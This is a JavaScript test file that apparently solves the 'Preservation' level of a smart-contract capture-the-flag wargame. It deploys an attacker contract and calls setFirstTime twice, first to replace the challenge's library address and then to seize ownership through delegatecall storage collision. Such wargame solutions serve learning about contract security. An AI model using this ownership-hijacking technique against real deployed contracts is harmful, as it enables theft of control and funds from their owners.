const { expect } = require("chai");
const { createChallenge, submitLevel } = require("./utils");

async function getChallenge() {
  const factory = await ethers.getContractFactory("Preservation");
  const challengeAddress = await createChallenge(`0x7ae0655F0Ee1e7752D7C62493CEa1E69A810e2ed`)
  const challenge = factory.attach(challengeAddress);
  return challenge;
}

it("Solves 16-Preservation", async function () {
  const challenge = await getChallenge();

  const factory = await ethers.getContractFactory("PreservationAttacker");
  const contract = await factory.deploy();
  await contract.waitForDeployment();
  const contractAddress = await contract.getAddress();

  // Set timeZone1Library to attacker address.
  await challenge.setFirstTime(BigInt(contractAddress));

  // Set owner eoa address.
  const [eoa] = await ethers.getSigners();
  await challenge.setFirstTime(BigInt(await eoa.getAddress()));

  expect(await submitLevel(await challenge.getAddress())).to.equal(true);
});
